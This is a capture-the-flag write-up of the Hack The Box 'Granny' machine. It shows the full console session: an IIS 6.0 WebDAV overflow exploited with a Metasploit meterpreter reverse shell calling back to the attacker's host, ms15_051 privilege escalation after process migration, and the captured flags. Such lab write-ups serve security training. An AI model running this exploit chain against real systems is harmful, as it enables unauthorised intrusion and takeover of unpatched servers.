---
date: 2024-02-02
title: Granny HTB Write-Up
machine_ip: 10.10.10.15
os: Windows
difficulty: Easy
my_rating: 4
tags:
  - Web
  - FileUpload
  - Misconfig
  - ASP
references: "[[📚CTF Box Writeups]]"
---
## Information Gathering

### Enumeration

Nmap scan for IP 10.10.10.15

```
-[Thu Feb 01-15:41:24]-[table@parrot]-
-[~]$ nmap -sV -sC 10.10.10.15
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-01 15:50 PST
Nmap scan report for 10.10.10.15
Host is up (0.074s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|_  Server Date: Thu, 01 Feb 2024 23:50:41 GMT
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.96 seconds

```

Port 80 is open with Microsoft IIS httpd 6.0 identified as the web server. As this is the only port open, I will investigate any vulnerabilities for this service.

Upon visiting the IP address in a browser, we see a web page under construction:&#x20;

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption><p>IIS Under Construction</p></figcaption></figure>

### Vulnerability Assessment

Exploit Database resulted in 11 known exploits for the Microsoft IIS 6.0 vulnerability:

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption><p>exploit-db for MS IIS 6.0</p></figcaption></figure>

Metasploit resulted in one exploit for this vulnerability so we will start with the one exploit first.

```
[msf](Jobs:0 Agents:0) >> search exploit Microsoft IIS 6.0                  

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl

```

Searchsploit resulted in the same 11 exploits discovered on exploit-db.com:

```
-[Thu Feb 01-16:31:42]-[table@parrot]-
-[~]$ searchsploit microsoft iis 6.0
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                    | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                             | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                               | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                        | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                              | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                            | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                             | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                         | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                         | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                     | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                            | windows/remote/19033.txt
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

After checking the exploit files, I returned the msfconsole to search for the Auth Bypass exploits for IIS6 and came across the following two vulnerabilities:

```
[msf](Jobs:0 Agents:0) >> search exploit iis6                                                                                                 [1/1801]
                                                                                                                                                      
Matching Modules
================

   #  Name                                                   Disclosure Date  Rank    Check  Description
   -  ----                                                   ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/dir_webdav_unicode_bypass                        normal  No     MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner
   1  auxiliary/scanner/http/ms09_020_webdav_unicode_bypass                   normal  No     MS09-020 IIS6 WebDAV Unicode Authentication Bypass


Interact with a module by name or index. For example info 1, use 1 or use auxiliary/scanner/http/ms09_020_webdav_unicode_bypass

```

### Exploitation

Use the msf exploit, set the RHOSTS to target machine IP, set the LHOST to my tun0 ip and run the exploit.&#x20;

```
[msf](Jobs:0 Agents:0) >> search exploit Microsoft IIS 6.0                  

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank    Check  Description
   -  ----                                                 ---------------  ----    -----  -----------
   0  exploit/windows/iis/iis_webdav_scstoragepathfromurl  2017-03-26       manual  Yes    Microsoft IIS WebDav ScStoragePathFromUrl Overflow


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/iis/iis_webdav_scstoragepathfromurl

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> set LHOST tun0
LHOST => 10.10.14.16
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> set RHOSTS 10.10.10.15
RHOSTS => 10.10.10.15
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS         10.10.10.15      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.14.16      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name

```

Resulted in Meterpreter session, so I converted it to shell and checked my credentials with whoami and found the Administrator account and the likely user account, Lakis:

```
[msf](Jobs:0 Agents:0) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> exploit

[*] Started reverse TCP handler on 10.10.14.16:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175686 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.16:4444 -> 10.10.10.15:1030) at 2024-02-01 16:09:34 -0800

(Meterpreter 1)(c:\windows\system32\inetsrv) > shell
[-] Failed to spawn shell with thread impersonation. Retrying without it.
Process 1516 created.
Channel 2 created.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami 
whoami 
nt authority\network service

------------------------------------------

C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 424C-F32D

 Directory of C:\Documents and Settings

04/12/2017  09:19 PM    <DIR>          .
04/12/2017  09:19 PM    <DIR>          ..
04/12/2017  08:48 PM    <DIR>          Administrator
04/12/2017  04:03 PM    <DIR>          All Users
04/12/2017  09:19 PM    <DIR>          Lakis
               0 File(s)              0 bytes
               5 Dir(s)   1,378,058,240 bytes free

C:\Documents and Settings>cd Administrator
cd Administrator
Access is denied.

C:\Documents and Settings>cd Lakis
cd Lakis
Access is denied.

```

### Privilege Escalation

Now with the service account, I need to elevate my privileges. This proved time consuming so I backgrounding this session and am trying the next exploit, one from the searchsploit results:

<pre><code><strong>(Meterpreter 1)(c:\windows\system32\inetsrv) > background
</strong>[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(windows/iis/iis_webdav_scstoragepathfromurl) >> sessions

Active sessions
===============

  Id  Name  Type                     Information  Connection
  --  ----  ----                     -----------  ----------
  1         meterpreter x86/windows               10.10.14.16:4444 -> 10.10.10.15:1030 (10.10.10.15)

--------------------------------------------------------

Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                             | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                         | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                         | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                     | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                            | windows/remote/19033.txt
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
-[Thu Feb 01-16:36:43]-[table@parrot]-
-[~]$ searchsploit -p 8765
  Exploit: Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass
      URL: https://www.exploit-db.com/exploits/8765
     Path: /usr/share/exploitdb/exploits/windows/remote/8765.php
    Codes: N/A
 Verified: True
File Type: PHP script, ASCII text
Copied EDB-ID #8765's path to the clipboard
-[Thu Feb 01-16:36:49]-[table@parrot]-
-[~]$ searchsploit -m 8765
  Exploit: Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass
      URL: https://www.exploit-db.com/exploits/8765
     Path: /usr/share/exploitdb/exploits/windows/remote/8765.php
    Codes: N/A
 Verified: True
File Type: PHP script, ASCII text
Copied to: /home/table/8765.php

</code></pre>

I lacked an understanding of what to do next so I returned the msfconsole to search for IIS6 exploits and began to follow a Bypass Auth exploit, which should get me into the Administrator and Lakis folders that I previously did not have access to

***

### Write Up referenced at this point

Within the meterpreter shell, I can further search for exploits for the local environment:

```
(Meterpreter 1)(c:\Documents and Settings) > run post/multi/recon/local_exploit_suggester

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 188 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.15 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.

```

Next, I background the session and use the client\_copy\_image exploit in msfconsole, setting the SESSION to 1 and LHOST to tun0:

<pre><code>(Meterpreter 1)(c:\Documents and Settings) > background
[*] Backgrounding session 1...

[msf](Jobs:0 Agents:1) >> search exploit ms15_051
<strong>
</strong>Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  exploit/windows/local/ms15_051_client_copy_image  2015-05-12       normal  Yes    Windows ClientCopyImage Win32k Exploit


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms15_051_client_copy_image

[msf](Jobs:0 Agents:1) >> use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.0.79     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> set LHOST tun0
LHOST => 10.10.14.16
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> set SESSION 1
SESSION => 1

msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> exploit

[*] Started reverse TCP handler on 10.10.14.16:4444 
[-] Exploit failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.
[*] Exploit completed, but no session was created.

</code></pre>

Exploit is not working and after watching the IppSec walkthrough video, it is because we do not have enough privilege. The exploit is working but we do not have access.

The solution to this is to then migrate to another service:

```
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(c:\Documents and Settings) > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 320   272   csrss.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 584   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 772   392   svchost.exe
 788   392   svchost.exe
 924   392   spoolsv.exe
 952   392   msdtc.exe
 1064  392   cisvc.exe
 1112  392   svchost.exe
 1168  392   inetinfo.exe
 1204  392   svchost.exe
 1216  1064  cidaemon.exe
 1260  1064  cidaemon.exe
 1312  392   VGAuthService.exe
 1376  392   vmtoolsd.exe
 1484  392   svchost.exe
 1588  392   svchost.exe
 1672  1064  cidaemon.exe
 1768  392   dllhost.exe
 1936  392   alg.exe
 1964  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 2040  1484  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2112  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2408  584   wmiprvse.exe
 2440  2040  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3068  584   davcdata.exe
 3152  1484  w3wp.exe
 3360  344   logon.scr

```

IppSec speculates that we are likely in the rundll32.exe service. I suppose I can tell this in the future by checking the User and Path columns. There is no data in the User column for the rundll32.exe service but there is for the other service we want to migrate to, the davcdata.exe:

```
(Meterpreter 1)(c:\Documents and Settings) > migrate 2112
[*] Migrating from 2440 to 2112...
[*] Migration completed successfully.
(Meterpreter 1)(C:\WINDOWS\system32) > getuid
Server username: NT AUTHORITY\NETWORK SERVICE

```

This confirms we were in rundll32.exe and now we have the tokens to run the previous exploit.

So, we background this session and run the client\_copy\_image exploit:

```
(Meterpreter 1)(C:\WINDOWS\system32) > background
[*] Backgrounding session 1...
[msf](Jobs:0 Agents:1) exploit(windows/local/ms15_051_client_copy_image) >> run

[*] Started reverse TCP handler on 10.10.14.16:4444 
[*] Reflectively injecting the exploit DLL and executing it...
[*] Launching netsh to host the DLL...
[+] Process 200 launched.
[*] Reflectively injecting the DLL into 200...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.16:4444 -> 10.10.10.15:1031) at 2024-02-01 17:30:18 -0800

(Meterpreter 2)(C:\WINDOWS\system32) > 
```

Now we hunt for the flag!

```
(Meterpreter 2)(C:\) > cd Documents\ and\ Settings\\
(Meterpreter 2)(C:\Documents and Settings) > cd Administrator\\
(Meterpreter 2)(C:\Documents and Settings\Administrator) > dir
Listing: C:\Documents and Settings\Administrator
================================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040555/r-xr-xr-x  0       dir   2017-04-12 07:12:18 -0700  Application Data
040777/rwxrwxrwx  0       dir   2017-04-12 11:51:24 -0700  Cookies
040777/rwxrwxrwx  0       dir   2017-04-12 07:28:57 -0700  Desktop
040555/r-xr-xr-x  0       dir   2017-04-12 07:12:19 -0700  Favorites
040777/rwxrwxrwx  0       dir   2017-04-12 06:42:54 -0700  Local Settings
040555/r-xr-xr-x  0       dir   2017-04-12 07:12:20 -0700  My Documents
100666/rw-rw-rw-  786432  fil   2021-09-16 04:54:52 -0700  NTUSER.DAT
040777/rwxrwxrwx  0       dir   2017-04-12 06:42:54 -0700  NetHood
040777/rwxrwxrwx  0       dir   2017-04-12 06:42:54 -0700  PrintHood
040555/r-xr-xr-x  0       dir   2017-04-12 12:15:43 -0700  Recent
040555/r-xr-xr-x  0       dir   2017-04-12 07:12:17 -0700  SendTo
040555/r-xr-xr-x  0       dir   2017-04-12 06:42:54 -0700  Start Menu
100666/rw-rw-rw-  0       fil   2017-04-12 06:44:12 -0700  Sti_Trace.log
040777/rwxrwxrwx  0       dir   2017-04-12 06:42:54 -0700  Templates
040777/rwxrwxrwx  0       dir   2017-04-12 11:48:10 -0700  UserData
100666/rw-rw-rw-  1024    fil   2021-09-16 04:54:52 -0700  ntuser.dat.LOG
100666/rw-rw-rw-  178     fil   2021-09-16 04:54:52 -0700  ntuser.ini

(Meterpreter 2)(C:\Documents and Settings\Administrator) > cd Desktop
(Meterpreter 2)(C:\Documents and Settings\Administrator\Desktop) > dir
Listing: C:\Documents and Settings\Administrator\Desktop
========================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 12:17:07 -0700  root.txt

(Meterpreter 2)(C:\Documents and Settings\Administrator\Desktop) > cat root.txt
aa4beed1c0584445ab463a6747bd06e9
```

Root flag = <mark style="background-color:green;">aa4beed1c0584445ab463a6747bd06e9</mark>

```
(Meterpreter 2)(C:\Documents and Settings\Administrator) > cd ..
(Meterpreter 2)(C:\Documents and Settings) > cd Lakis\\
(Meterpreter 2)(C:\Documents and Settings\Lakis) > dir
Listing: C:\Documents and Settings\Lakis
========================================

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040555/r-xr-xr-x  0       dir   2017-04-12 12:19:48 -0700  Application Data
040777/rwxrwxrwx  0       dir   2017-04-12 07:04:02 -0700  Cookies
040777/rwxrwxrwx  0       dir   2017-04-12 12:19:58 -0700  Desktop
040555/r-xr-xr-x  0       dir   2017-04-12 12:19:49 -0700  Favorites
040777/rwxrwxrwx  0       dir   2017-04-12 06:42:54 -0700  Local Settings
040555/r-xr-xr-x  0       dir   2017-04-12 12:19:49 -0700  My Documents
100666/rw-rw-rw-  524288  fil   2017-04-12 12:20:22 -0700  NTUSER.DAT
040777/rwxrwxrwx  0       dir   2017-04-12 06:42:54 -0700  NetHood
040777/rwxrwxrwx  0       dir   2017-04-12 06:42:54 -0700  PrintHood
040555/r-xr-xr-x  0       dir   2017-04-12 12:19:49 -0700  Recent
040555/r-xr-xr-x  0       dir   2017-04-12 12:19:47 -0700  SendTo
040555/r-xr-xr-x  0       dir   2017-04-12 06:42:54 -0700  Start Menu
100666/rw-rw-rw-  0       fil   2017-04-12 06:44:12 -0700  Sti_Trace.log
040777/rwxrwxrwx  0       dir   2017-04-12 06:42:54 -0700  Templates
100666/rw-rw-rw-  1024    fil   2017-04-12 12:20:22 -0700  ntuser.dat.LOG
100666/rw-rw-rw-  178     fil   2017-04-12 12:20:22 -0700  ntuser.ini

(Meterpreter 2)(C:\Documents and Settings\Lakis) > cd Desktop\\
(Meterpreter 2)(C:\Documents and Settings\Lakis\Desktop) > dir
Listing: C:\Documents and Settings\Lakis\Desktop
================================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100444/r--r--r--  32    fil   2017-04-12 12:20:07 -0700  user.txt

(Meterpreter 2)(C:\Documents and Settings\Lakis\Desktop) > cat user.txt 
700c5dc163014e22b3e408f8703f67d1
```

User flag = <mark style="background-color:green;">700c5dc163014e22b3e408f8703f67d1</mark>
